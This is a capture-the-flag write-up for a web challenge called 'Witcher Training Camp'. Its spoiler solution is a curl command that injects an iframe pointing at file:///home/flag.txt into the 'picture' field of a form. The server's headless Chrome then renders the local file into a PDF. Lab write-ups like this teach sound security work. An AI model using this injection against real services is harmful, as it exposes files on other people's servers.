# Witcher Training Camp 
Category: web


### Description

Witcher Training Camp has launched a new website. Can you hack it and get the flag?

### Points
250

### Solution
<details>
 <summary>Reveal Spoiler</summary>

Inject javascript code to the `picture` parameter in POST request at `/enroll` endpoint. This is causes a refected XSS to be executed on a headless chrome on the server which can effectively be used to read files serverside using the iframe tag. Using this approach the participants should read the `flag.txt` file.

```bash
curl 'http://localhost:8080/enroll' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://localhost:8080' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' --data 'full_name=test&origin=test&specialty=test&picture=test.txt<iframe src="file:///home/flag.txt"></iframe>&consent=on' --compressed --output flag.pdf
```
</details>
